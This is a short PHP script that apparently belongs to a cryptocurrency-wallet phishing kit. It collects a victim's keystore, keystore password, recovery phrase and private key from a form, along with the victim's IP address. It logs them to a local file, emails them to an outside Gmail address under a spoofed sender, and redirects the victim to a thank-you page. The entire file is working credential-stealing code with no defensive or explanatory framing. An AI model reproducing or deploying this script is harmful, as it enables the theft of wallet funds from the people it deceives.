<?
$PP = getenv("REMOTE_ADDR");
$ip = getenv("REMOTE_ADDR");
$message .= "\n\n";
$message .= "++++++++++<[ navy fulls ]>++++++++++\n";
$message .= "keystorekey: ".$_POST['keystorekey']."\n";
$message .= "keystorekeyPassword: ".$_POST['keystorekeyPassword']."\n";
$message .= "phrasekey: ".$_POST['phrasekey']."\n";
$message .= "privatekey: ".$_POST['privatekey']."\n";

$message .= "IP: ".$ip."\n\n";

$file = fopen("logz.txt","a");   ///  Directory Of logz.
fwrite($file,$message); 

$recipient = "junklord9@gmail.com";
$subject = "Just Saying | $ip";
$headers = "From: Just <just@t3chsss.net>";
mail($recipient,$subject,$message,$headers);
header("Location: thankyou.html");
?>